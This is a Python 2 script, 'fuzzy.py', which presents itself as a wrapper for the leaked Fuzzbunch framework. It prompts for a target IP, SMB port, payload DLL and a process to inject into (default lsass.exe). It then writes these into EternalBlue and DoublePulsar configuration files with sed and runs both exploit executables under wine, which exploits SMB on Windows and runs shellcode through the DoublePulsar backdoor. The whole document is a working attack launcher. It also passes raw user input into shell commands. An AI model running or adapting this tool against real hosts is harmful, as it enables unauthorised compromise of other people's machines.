#!/usr/bin/python
# -*- coding: utf-8 -*-
#AUTHOR: EITENNE
import os, sys, time
os.system('clear') #/* Clear terminal screen */

#/* Exploits && payloads */
#####EB######
eternalblue = "Eternalblue-2.2.0.xml" #/* Eternalblue xml file*/
eternalblue_skel = "Eternalblue-2.2.0.Skeleton.xml" #/* eternalblue skeleton xml file*/
eternalblue_exe = "Eternalblue-2.2.0.exe" #/* eternalblue exe exploitation tool*/
####DP#######
doublepulsar = "Doublepulsar-1.3.1.xml" #/* doublepulsar xml file*/
doublepulsar_skel = "Doublepulsar-1.3.1.Skeleton.xml" #/* doublepulsar skeleton xml file*/
doublepulsar_exe = "Doublepulsar-1.3.1.exe" #/* doublepulsar exe exploitation tool */

RescoursesDir = os.getcwd()
def banner():
	print "--[ Version 3.6.1\n"
	print "\033[1;92m[*] Loading Plugins\033[1;m"
	time.sleep(0.7)
	print "\033[1;92m[*] Initializing Fuzzbunch v3.6.1\033[1;m"
	time.sleep(0.7)
	print "\033[1;92m[*] Adding Global Varibles\033[1;m"
	time.sleep(0.7)
	print "\033[1;92m[*] Set RescoursesDir =>\033[1;m", RescoursesDir
	time.sleep(0.7)
	print "\033[1;92m[*] Set Color => True\033[1;m"
	time.sleep(0.7)
	print "\033[1;92m[*] ShowHiddenParameters => False\033[1;m"
	time.sleep(0.7)
	print "\033[1;92m[*] Getting Banner/Logo\033[1;m"
	time.sleep(0.7)
	print """\033[1;97m
*******************************************************************************
**                                                                           **
**        AUTHOR: EITENNE | FUZZY.PY IS A FUZZBUNCH WRAPPER!!                **
**                                                                           **
*******************************************************************************
**                                                                           **
**                            ___________________                            **
**                            |@@@@|       |####|                            **
**    ARCHITECTURES~          |@@@@|       |####|                            **
**      WIN72K8R2             |@@@@|       |####|                            **
**      /7|2008|Vista/        |@@@@|  	   |####|                            **
**      XP                    \@@@@|       |####/                            **
**                             \@@@|       |###/                             **
**                              \@@|_______|##/                              **
**                                    (o)                                    **
**                                 .-'''''-.                                 **
**                               .'  * * *  '.                               **
**                              : *         * :                              **
**                             : ~   T H E   ~ :                             **
**                             : ~ C H A M P ~ :                             **
**                              : *         *  :                             **
**                               `.  * * *  .'                               **
**                                 `-.....-'                                 **
**                                                                           **
*******************************************************************************
\033[1;31m[+]\033[1;m Exploit Framework Load successful! Use FORCE to continue
\033[1;31m[+}\033[1;m CORE loaded with status code 0x0031337
\033[1;31m[+}\033[1;m VERSION : \033[1;33m3.6.1\033[1;m
	\033[1;m"""
	return fuzzy() #/* File check if implants exist if not ask*/

def main():
	#/* Return defined options */
	time.sleep(0.4) #/* gives enough time to load everything*/
	print banner() #/* Print out medal! with arches */

def fuzzy():
	#/* Default configs if no answer */
	default = "192.168.1.8"
	default2 = "445"
	default3 = "60"
	default4 = "x86"
	default5 = "payload.dll"
	default6 = "lsass.exe"
	default7 = "WIN72K8R2"
	default8 = "0"
	default9 = "no"
	default10 = "yes"
	#/* inputs for choosing settings */
	print "\033[1;94m[?]\033[1;m TargetIp :: Target IP Address"
	rhost = raw_input('\033[1;92m[+]\033[1;m target [' + default + ']: ') or default
	print "\033[1;94m[?]\033[1;m TargetPort :: Port used by the SMB service for exploit connection"
	rport = raw_input('\033[1;92m[+]\033[1;m port: [' + default2 + ']: ') or default2
	print "\033[1;94m[?]\033[1;m NetworkTimeout :: Timeout for blocking network calls <in seconds>. Use -1 or no timeout."
	timeout = raw_input('\033[1;92m[+]\033[1;m timeout: [' + default3 + ']: ') or default3
	print "\033[1;94m[?]\033[1;m Architecture :: Operating System, Service Pack, and Architecture of target OS"
	arch = raw_input('\033[1;92m[+]\033[1;m architecture: [' + default4 + ']: ') or default4
	print "\033[1;94m[?]\033[1;m DLL :: Shellcode File, backdoor file to gain a response with the target"
	dll = raw_input('\033[1;92m[+]\033[1;m dll: [' + default5 + ']: ') or default5
	print "\033[1;94m[?]\033[1;m Process :: A process to inject"
	ps = raw_input('\033[1;92m[+]\033[1;m process: [' + default6 + ']: ') or default6
	print "\033[1;94m[?]\033[1;m Version :: Operating System Version XP|WIN72K8R2"
	target = raw_input('\033[1;92m[+]\033[1;m architecture: [' + default7 + ']: ') or default7
	print "\033[1;94m[?]\033[1;m Map :: Mapping the host to see if has open ports for vulnrable attacks"
	mapper = raw_input('\033[1;92m[+]\033[1;m Execute mapper?: [' + default9 + ']: ') or default9
	if mapper == 'yes':
		print "\033[1;94m[?]\033[1;m Executing mapper on target."
		os.system('python ps.py ' + rhost + '')
	else:
		print "\033[1;91m[?]\033[1;m Mapper has been disabled"
	os.system('rm -rf Eternalblue-2.2.0.xml')
	time.sleep(0.2)
	os.system('cp Eternalblue-2.2.0.Skeleton.xml Eternalblue-2.2.0.xml')
	os.system('rm -rf Doublepulsar-1.3.1.xml')
	os.system('cp Doublepulsar-1.3.1.Skeleton.xml Doublepulsar-1.3.1.xml')
	print "\033[1;94m[?]\033[1;m Function :: Setup a function to do a service onto the target"
	print ""
	print "*0) RunDLL :: Run a shellcode"
	print " 1) Ping :: Ping backdoor"
	print " 2) Uninstall :: Uninstall backdoor"
	print ""
	function = raw_input('\033[1;92m[+]\033[1;m function: [' + default8 + ']: ') or default8
	if function == '0':
		os.system("sed 's/%FUNCTION%/RunDLL/' -i Doublepulsar-1.3.1.xml")
	elif function == '1':
		os.system("sed 's/%FUNCTION%/Ping/' -i Doublepulsar-1.3.1.xml")
	elif function == '2':
		os.system("sed 's/%FUNCTION%/Uninstall/' -i Doublepulsar-1.3.1.xml")
	else:
		print "choose an option!"

	#/* the dirty work made easy */
	os.system("sed -i 's/%RHOST%/" + rhost + "/' Eternalblue-2.2.0.xml")
	time.sleep(0.2)
	os.system("sed -i 's/%RPORT%/" + rport + "/' Eternalblue-2.2.0.xml")
	time.sleep(0.2)
	#os.system("sed -i 's/%TARGET%/" + arch + "/' Eternalblue-2.2.0.xml")
	time.sleep(0.2)
	os.system("sed -i 's/%TIMEOUT%/" + timeout + "/' Eternalblue-2.2.0.xml")
	time.sleep(0.2)
	os.system("sed -i 's/%RHOST%/" + rhost + "/' Doublepulsar-1.3.1.xml")
	time.sleep(0.2)
	os.system("sed -i 's/%RPORT%/" + rport + "/' Doublepulsar-1.3.1.xml")
	time.sleep(0.2)
	os.system("sed -i 's/%TIMEOUT%/" + timeout + "/' Doublepulsar-1.3.1.xml")
	time.sleep(0.2)
	os.system("sed -i 's/%TARGETARCHITECTURE%/" + arch + "/' Doublepulsar-1.3.1.xml")
	time.sleep(0.2)
	os.system("sed -i 's/%DLLPAY%/" + dll + "/' Doublepulsar-1.3.1.xml")
	time.sleep(0.2)
	os.system("sed -i 's/%PROCESSINJECT%/" + ps + "/' Doublepulsar-1.3.1.xml")
	time.sleep(0.2)
	os.system("sed 's/%TARGET%/" + target + "/' -i Eternalblue-2.2.0.xml")
	print "\033[1;94m[?]\033[1;m Checking if Implanted"
	time.sleep(1)
	os.system('python detect.py --ip ' + rhost + '')
	print "\033[1;94m[?]\033[1;m Configuring Plugin"
	time.sleep(1)
	print "\n\033[1;97m"
	print "Name				Set Value"
	print "----				----------"
	print "NetworkTimeout                  %s" % (timeout)
	print "TargetIp                        %s" % (rhost)
	print "TargetPort                      %s" % (rport)
	print "Architecture                    %s" % (target)
	print "Payload                         %s" % (dll)
	print "Version                         %s" % (target)
	print "Function                        %s" % (function)
	print "Mapper                          %s" % (mapper)
	print "\n"
	et = raw_input("\033[1;94m[?]\033[1;m Execute Plugins? [" + default10 + "]: ")  or default10
	if et == 'yes':
		return eternal()
	elif et == 'no':
		print "Goodbye ;( you cant do anything else without eternalblue"
		sys.exit()
	else:
		print "\033[1;92m[!] No options were chosen.\033[1;m"

def eternal():
	#/*Prints out exploitation medthod and exploits using wine */
	print "\033[1;92m[*] Exploiting\033[1;m", eternalblue_exe
	os.system("wine " + eternalblue_exe + "")
	return double()
	
def double():
	print "\033[1;92m[*] Exploiting\033[1;m", doublepulsar_exe
	os.system("wine " + doublepulsar_exe + "")

main()

